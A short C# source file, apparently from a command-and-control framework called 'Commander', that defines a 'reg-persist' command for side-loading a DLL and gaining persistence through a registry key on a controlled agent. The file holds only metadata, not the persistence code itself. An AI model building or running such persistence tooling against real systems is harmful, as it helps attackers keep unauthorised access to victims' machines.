using Commander.Communication;
using Commander.Executor;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Inject
{
    public class RegKeyPersistenceCommand : SiteLoadCommand
    {
        public override string Description => "Side load a dll adding persistence using RegKey and the exe in parameter";
        public override string Name => "reg-persist";
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override string ExeName => "RegKeyPersistence.exe";

    }
}
